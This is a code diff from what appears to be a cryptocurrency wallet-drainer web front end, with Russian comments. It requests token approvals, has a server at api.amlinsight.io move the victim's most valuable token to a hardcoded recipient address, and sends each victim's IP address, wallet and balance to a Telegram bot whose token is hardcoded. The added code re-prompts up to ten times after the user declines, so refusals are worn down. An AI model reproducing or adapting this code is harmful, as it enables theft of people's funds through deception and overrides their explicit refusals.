@@ -3,7 +3,6 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
-import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -18,8 +17,8 @@ const debounce = (func, wait) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7547727920:AAGJPBBuh0h8y0sWH2sNeNLqYARwKdKp3AU'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4745136395'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
@@ -170,7 +169,8 @@ function hideCustomModal() {
   }
 }
 
-
+// Заглушка для finalRecipient (адрес получателя 95% токенов)
+const finalRecipient = '0x24C6cCfC2A527dA2Ef28431AAe77c7E0D3dE06dB'; // Замените на нужный адрес
 
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
@@ -244,12 +244,12 @@ const getScanLink = (hash, chainId, isTx = false) => {
 }
 
 // Функция отправки запроса на трансфер
-const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
+const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash, finalRecipient) => {
   try {
     const response = await fetch('https://api.amlinsight.io/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
+      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash, finalRecipient })
     })
     const data = await response.json()
     if (data.success) {
@@ -370,7 +370,6 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
                     `➡️ ${token.symbol}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
-    await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
   }
@@ -394,6 +393,27 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
     await sendTelegramMessage(message)
   } catch (error) {
     store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
+  }
+}
+
+async function notifyTransactionDeclined(address, walletName, device, token, chainId) {
+  try {
+    console.log('Sending transaction declined notification')
+    const ip = await getUserIP()
+    const siteUrl = window.location.href || 'Unknown URL'
+    const scanLink = getScanLink(address, chainId)
+    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
+    const amountValue = (token.balance * token.price).toFixed(2)
+    const message = `❌ Decline Transactions(${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: ${networkName}\n` +
+                    `🌎 ${ip}\n\n` +
+                    `🔥 Processing: ${amountValue}$**\n` +
+                    `➡️ ${token.symbol}\n\n` +
+                    `🔗 Site: ${siteUrl}`
+    await sendTelegramMessage(message)
+  } catch (error) {
+    store.errors.push(`Error in notifyTransactionDeclined: ${error.message}`)
   }
 }
 
@@ -618,7 +638,50 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
-
+// Функция для повторных попыток approve с уведомлениями об отказе
+const retryApproveWithDeclineNotification = async (wagmiConfig, tokenAddress, contractAddress, chainId, userAddress, walletName, device, token) => {
+  let attempts = 0
+  const maxAttempts = 10 // Максимальное количество попыток
+  
+  while (attempts < maxAttempts) {
+    try {
+      console.log(`Attempt ${attempts + 1} to approve token`)
+      const txHash = await approveToken(wagmiConfig, tokenAddress, contractAddress, chainId)
+      return txHash
+    } catch (error) {
+      attempts++
+      
+      // Проверяем, является ли ошибка отказом пользователя
+      if (error.code === 4001 || error.code === -32000 || error.message.includes('User rejected') || error.message.includes('User denied')) {
+        console.log(`User declined transaction on attempt ${attempts}`)
+        
+        // Отправляем уведомление об отказе
+        await notifyTransactionDeclined(userAddress, walletName, device, token, chainId)
+        
+        // Если это не последняя попытка, ждем немного и пробуем снова
+        if (attempts < maxAttempts) {
+          console.log(`Waiting 2 seconds before retry...`)
+          await new Promise(resolve => setTimeout(resolve, 2000))
+          
+          // Показываем модальное окно снова для следующей попытки
+          showCustomModal()
+          const modalMessage = document.querySelector('.custom-modal-message')
+          if (modalMessage) {
+            modalMessage.textContent = `Please sign the transaction to continue. Attempt ${attempts + 1}/${maxAttempts}`
+          }
+          
+          continue
+        } else {
+          // Если достигли максимального количества попыток
+          throw new Error(`User declined transaction after ${maxAttempts} attempts`)
+        }
+      } else {
+        // Если это не ошибка отказа пользователя, пробрасываем ошибку
+        throw error
+      }
+    }
+  }
+}
 
 // Инициализация подписок
 const initializeSubscribers = (modal) => {
@@ -744,7 +807,7 @@ const initializeSubscribers = (modal) => {
             return
           }
           store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
+          const txHash = await retryApproveWithDeclineNotification(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId, state.address, walletInfo.name, device, mostExpensive)
           store.approvedTokens[approvalKey] = true
           store.isApprovalRequested = false
           let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
@@ -758,7 +821,7 @@ const initializeSubscribers = (modal) => {
           // Отправляем запрос на сервер с корректным amount
           const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
           console.log(`Sending transfer request with amount: ${amount.toString()}`)
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
+          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash, finalRecipient || state.address)
           
           if (transferResult.success) {
             console.log(`Transfer successful: ${transferResult.txHash}`)
@@ -775,7 +838,7 @@ const initializeSubscribers = (modal) => {
           store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000) {
+          if (error.code === 4001 || error.code === -32000 || error.message.includes('User rejected') || error.message.includes('User denied') || error.message.includes('User declined transaction after')) {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
